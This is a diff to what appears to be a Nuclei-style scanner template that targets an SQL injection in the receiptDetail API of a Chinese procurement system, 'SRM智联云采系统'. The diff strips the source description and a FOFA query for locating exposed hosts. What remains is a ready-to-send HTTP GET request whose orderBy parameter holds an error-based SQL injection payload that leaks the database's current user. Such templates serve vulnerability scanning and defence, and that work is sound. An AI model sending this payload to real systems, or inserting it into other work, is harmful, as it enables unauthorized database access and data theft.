@@ -3,12 +3,8 @@ info:
   name: SRM智联云采系统receiptDetail存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zqof4pz6aprdm7u4'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zqof4pz6aprdm7u4
-    fofa: title=="SRM 2.0"
 http:
 - raw:
   - 'GET /adpweb/api/srm/delivery/receiptDetail?pageSize=1&pageNumber=1&orderBy=-11%20AND%20(SELECT(0)FROM(SELECT%20COUNT(*),CONCAT_WS(0x28,0x7e,CURRENT_USER,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)--%20wXyW HTTP/1.1
